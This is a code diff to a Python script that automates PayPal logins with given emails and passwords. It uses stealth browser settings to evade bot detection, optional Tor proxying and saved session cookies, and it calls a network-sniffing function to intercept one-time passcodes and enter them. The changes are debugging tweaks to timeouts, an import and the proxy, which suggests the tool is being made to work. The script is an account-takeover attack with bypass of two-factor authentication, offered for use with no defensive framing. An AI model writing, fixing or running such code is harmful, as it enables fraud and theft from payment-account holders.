@@ -11,7 +11,7 @@ from selenium.webdriver.chrome.options import Options as ChromeOptions
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from webdriver_manager.chrome import ChromeDriverManager
-import undetected_chromedriver as uc
+import undetected_chromedriver.v2 as uc
 import scapy.all as scapy  # For network sniffing
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -19,7 +19,7 @@ from selenium.webdriver.support import expected_conditions as EC
 # ---------- CONFIGURATION ----------
 SESSION_COOKIE_FILE = "paypal_cookies.json"  # Store session cookies
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
-PROXY = "socks5://127.0.0.1:9050"  # Example proxy (Tor SOCKS5)
+# PROXY = "socks5://127.0.0.1:9050"  # Example proxy (Tor SOCKS5) (commenting out for testing)
 
 # ---------- LOAD & SAVE COOKIES ----------
 def save_cookies(driver, filename):
@@ -45,7 +45,7 @@ def configure_stealth_options():
     options = ChromeOptions()
     options.add_argument("--disable-blink-features=AutomationControlled")
     options.add_argument(f"--user-agent={USER_AGENT}")
-    options.add_argument(f"--proxy-server={PROXY}")
+    # options.add_argument(f"--proxy-server={PROXY}")  # Commenting this out for testing
     return options
 
 # ---------- NETWORK SNIFFING FOR OTP INTERCEPTION ----------
@@ -77,7 +77,7 @@ def browser_automation_attack(email, password):
 
     try:
         print("[*] Entering email...")  # Debugging point
-        email_input = WebDriverWait(driver, 10).until(
+        email_input = WebDriverWait(driver, 20).until(
             EC.presence_of_element_located((By.NAME, "login_email"))
         )
         email_input.send_keys(email)
@@ -89,7 +89,7 @@ def browser_automation_attack(email, password):
         stealth_delay()
 
         print("[*] Entering password...")  # Debugging point
-        password_input = WebDriverWait(driver, 10).until(
+        password_input = WebDriverWait(driver, 20).until(
             EC.presence_of_element_located((By.NAME, "login_password"))
         )
         password_input.send_keys(password)
@@ -104,7 +104,7 @@ def browser_automation_attack(email, password):
         otp_code = sniff_otp()  # This is where the OTP is snatched
         if otp_code:
             print(f"[*] Intercepted OTP: {otp_code}")
-            otp_input = WebDriverWait(driver, 10).until(
+            otp_input = WebDriverWait(driver, 20).until(
                 EC.presence_of_element_located((By.NAME, "otp"))
             )
             otp_input.send_keys(otp_code)
